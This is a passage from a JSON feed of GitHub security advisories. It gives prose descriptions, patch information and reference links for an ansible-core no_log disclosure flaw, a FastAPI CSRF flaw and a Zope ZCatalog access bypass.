            ]
        },
        {
            "content_html": "<p>An information disclosure flaw was found in ansible-core due to a failure to respect the <code>ANSIBLE_NO_LOG</code> configuration in some scenarios. It was discovered that information is still included in the output in certain tasks, such as loop items. Depending on the task, this issue may include sensitive information, such as decrypted secret values.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0690\">https://nvd.nist.gov/vuln/detail/CVE-2024-0690</a></li>\n<li><a href=\"https://github.com/ansible/ansible/pull/82565\">https://github.com/ansible/ansible/pull/82565</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-0690\">https://access.redhat.com/security/cve/CVE-2024-0690</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2259013\">https://bugzilla.redhat.com/show_bug.cgi?id=2259013</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/6935c8e303440addd3871ecf8e04bde61080b032\">https://github.com/ansible/ansible/commit/6935c8e303440addd3871ecf8e04bde61080b032</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/78db3a3de6b40fb52d216685ae7cb903c609c3e1\">https://github.com/ansible/ansible/commit/78db3a3de6b40fb52d216685ae7cb903c609c3e1</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/b9a03bbf5a63459468baf8895ff74a62e9be4532\">https://github.com/ansible/ansible/commit/b9a03bbf5a63459468baf8895ff74a62e9be4532</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/beb04bc2642c208447c5a936f94310528a1946b1\">https://github.com/ansible/ansible/commit/beb04bc2642c208447c5a936f94310528a1946b1</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:0733\">https://access.redhat.com/errata/RHSA-2024:0733</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/ansible-core/PYSEC-2024-36.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/ansible-core/PYSEC-2024-36.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h24r-m9qc-pvpg\">https://github.com/advisories/GHSA-h24r-m9qc-pvpg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h24r-m9qc-pvpg",
            "title": "[ansible-core] Ansible-core information disclosure flaw",
            "date_modified": "2024-02-14T14:57:22.000Z",
            "date_published": "2024-02-06T12:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h24r-m9qc-pvpg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>FastAPI versions lower than <code>0.65.2</code> that used cookies for authentication in path operations that received JSON payloads sent by browsers were vulnerable to a Cross-Site Request Forgery (CSRF) attack.</p>\n<p>In versions lower than <code>0.65.2</code>, FastAPI would try to read the request payload as JSON even if the <code>content-type</code> header sent was not set to <code>application/json</code> or a compatible JSON media type (e.g. <code>application/geo+json</code>).</p>\n<p>So, a request with a content type of <code>text/plain</code> containing JSON data would be accepted and the JSON data would be extracted.</p>\n<p>But requests with content type <code>text/plain</code> are exempt from <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a> preflights, for being considered <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests\">Simple requests</a>. So, the browser would execute them right away including cookies, and the text content could be a JSON string that would be parsed and accepted by the FastAPI application.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This is fixed in FastAPI <code>0.65.2</code>.</p>\n<p>The request data is now parsed as JSON only if the <code>content-type</code> header is <code>application/json</code> or another JSON compatible media type like <code>application/geo+json</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It's best to upgrade to the latest FastAPI.</p>\n<p>But still, it would be possible to add a middleware or a dependency that checks the <code>content-type</code> header and aborts the request if it is not <code>application/json</code> or another JSON compatible content type.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS on Mozilla web docs</a></li>\n<li><a href=\"https://security.stackexchange.com/questions/157528/ways-to-bypass-browsers-cors-policy/157531#157531\">This answer on StackExchange</a></li>\n<li><a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP CSRF</a></li>\n<li>Fixed in PR <a href=\"https://github.com/tiangolo/fastapi/pull/2118\">#2118</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments, write to <a href=\"mailto:security@tiangolo.com\">security@tiangolo.com</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tiangolo/fastapi/security/advisories/GHSA-8h2j-cgx8-6xv7\">https://github.com/tiangolo/fastapi/security/advisories/GHSA-8h2j-cgx8-6xv7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-32677\">https://nvd.nist.gov/vuln/detail/CVE-2021-32677</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/commit/fa7e3c996edf2d5482fff8f9d890ac2390dede4d\">https://github.com/tiangolo/fastapi/commit/fa7e3c996edf2d5482fff8f9d890ac2390dede4d</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MATAWX25TYKNEKLDMKWNLYDB34UWTROA\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MATAWX25TYKNEKLDMKWNLYDB34UWTROA</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8h2j-cgx8-6xv7\">https://github.com/advisories/GHSA-8h2j-cgx8-6xv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8h2j-cgx8-6xv7",
            "title": "[fastapi] Cross-Site Request Forgery (CSRF) in FastAPI",
            "date_modified": "2024-02-12T21:35:06.000Z",
            "date_published": "2021-06-10T15:43:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8h2j-cgx8-6xv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>ZCatalog plug-in index support capability for Zope 2.4.0 through 2.5.1 allows anonymous users and untrusted code to bypass access restrictions and call arbitrary methods of catalog indexes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2002-0688\">https://nvd.nist.gov/vuln/detail/CVE-2002-0688</a></li>\n<li><a href=\"https://web.archive.org/web/20020810160608/http://www.zope.org/Products/Zope/Hotfix_2002-06-14/security_alert\">https://web.archive.org/web/20020810160608/http://www.zope.org/Products/Zope/Hotfix_2002-06-14/security_alert</a></li>\n<li><a href=\"https://web.archive.org/web/20020822025750/http://www.iss.net/security_center/static/9610.php\">https://web.archive.org/web/20020822025750/http://www.iss.net/security_center/static/9610.php</a></li>\n<li><a href=\"https://web.archive.org/web/20021206023914/http://rhn.redhat.com/errata/RHSA-2002-060.html\">https://web.archive.org/web/20021206023914/http://rhn.redhat.com/errata/RHSA-2002-060.html</a></li>\n<li><a href=\"https://web.archive.org/web/20021223212650/http://online.securityfocus.com/bid/5812\">https://web.archive.org/web/20021223212650/http://online.securityfocus.com/bid/5812</a></li>\n<li><a href=\"https://web.archive.org/web/20070430090648/http://www.debian.org/security/2004/dsa-490\">https://web.archive.org/web/20070430090648/http://www.debian.org/security/2004/dsa-490</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7944-h5rw-qmjx\">https://github.com/advisories/GHSA-7944-h5rw-qmjx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7944-h5rw-qmjx",
            "title": "[zope] ZCatalog plug-in for Zope allows anonymous users to bypass access restrictions",
            "date_modified": "2024-02-12T20:33:01.000Z",
            "date_published": "2022-04-30T18:19:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7944-h5rw-qmjx"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}